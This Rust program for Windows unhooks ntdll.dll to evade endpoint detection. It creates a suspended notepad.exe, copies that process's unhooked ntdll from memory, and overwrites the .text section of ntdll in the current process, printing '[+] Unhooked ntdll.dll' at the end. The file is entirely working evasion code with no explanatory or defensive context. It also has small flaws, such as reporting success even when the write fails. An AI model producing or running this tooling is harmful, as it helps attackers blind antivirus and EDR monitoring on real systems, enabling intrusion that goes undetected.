use std::{
    mem::zeroed,
    num::FpCategory::Zero,
    os::raw::c_void,
    ptr::{null, null_mut},
    str::from_utf8,
};

use windows_sys::Win32::System::{
    Diagnostics::Debug::{
        IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER, ReadProcessMemory, WriteProcessMemory,
    },
    LibraryLoader::GetModuleHandleA,
    ProcessStatus::{GetModuleInformation, MODULEINFO},
    SystemServices::{IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_SIGNATURE},
    Threading::{
        CREATE_SUSPENDED, CreateProcessA, GetCurrentProcess, PROCESS_INFORMATION, ResumeThread,
        STARTUPINFOA, TerminateProcess,
    },
};

fn main() {
    unsafe {
        let mut si = zeroed::<STARTUPINFOA>();
        si.cb = size_of::<STARTUPINFOA>() as u32;

        let mut pi = zeroed::<PROCESS_INFORMATION>();

        if CreateProcessA(
            null_mut(),
            "notepad.exe\0".as_ptr() as *mut u8,
            null_mut(),
            null_mut(),
            0,
            CREATE_SUSPENDED,
            null_mut(),
            null_mut(),
            &mut si,
            &mut pi,
        ) == 0
        {
            println!("[-] Failed to create process!");
            return;
        }

        let h_ntdll = GetModuleHandleA("ntdll.dll\0".as_ptr() as *mut u8);

        if h_ntdll.is_null() {
            println!("[-] Failed to get handle to ntdll.dll!");
            return;
        }

        println!("[+] Ntdll.dll handle: {:p}", h_ntdll);

        let mut mod_info = zeroed::<MODULEINFO>();

        if GetModuleInformation(
            -1isize as *mut c_void,
            h_ntdll,
            &mut mod_info,
            size_of::<MODULEINFO>() as u32,
        ) == 0
        {
            println!("[-] Failed to get module information!");
            return;
        }

        let size = mod_info.SizeOfImage as usize;
        let mut ntdll_buffer: Vec<u8> = vec![0; size];

        if ReadProcessMemory(
            pi.hProcess,
            mod_info.lpBaseOfDll as *const c_void,
            ntdll_buffer.as_mut_ptr() as *mut c_void,
            size,
            null_mut(),
        ) == 0
        {
            println!("[-] Failed to read process memory!");
            return;
        }

        println!(
            "[+] Read ntdll.dll from suspended process, size: {} bytes",
            size
        );

        TerminateProcess(pi.hProcess, 0);

        let dos_header = ntdll_buffer.as_ptr() as *const IMAGE_DOS_HEADER;

        if (*dos_header).e_magic != IMAGE_DOS_SIGNATURE {
            println!("[-] Invalid DOS signature!");
            return;
        }

        let nt_headers = (ntdll_buffer.as_ptr() as *const u8).add((*dos_header).e_lfanew as usize)
            as *const IMAGE_NT_HEADERS64;

        if (*nt_headers).Signature != IMAGE_NT_SIGNATURE {
            println!("[-] Invalid NT signature!");
            return;
        }

        let first_section = (nt_headers as *const u8).add(size_of::<IMAGE_NT_HEADERS64>() as usize)
            as *const IMAGE_SECTION_HEADER;

        for i in 0..(*nt_headers).FileHeader.NumberOfSections {
            let section = first_section.add(i as usize);

            let name = from_utf8(&(*section).Name)
                .unwrap()
                .trim_end_matches(char::from(0));

            if name.eq_ignore_ascii_case(".text") {
                println!(
                    "[+] Found: {} section at 0x{:X}",
                    name,
                    (*section).VirtualAddress
                );

                let text_sec_addr =
                    (ntdll_buffer.as_ptr() as *const u8).add((*section).PointerToRawData as usize);
                let text_size = (*section).SizeOfRawData as usize;

                let ntdll_virtual_addr =
                    (h_ntdll as *const u8).add((*section).VirtualAddress as usize);

                let mut bytes_written: usize = 0;
                if WriteProcessMemory(
                    GetCurrentProcess(),
                    ntdll_virtual_addr as _,
                    text_sec_addr as _,
                    text_size,
                    &mut bytes_written,
                ) == 0
                {
                    println!("[-] Failed to replace the .text section");
                }

                break;
            }
        }

        println!("[+] Unhooked ntdll.dll");
    }
}
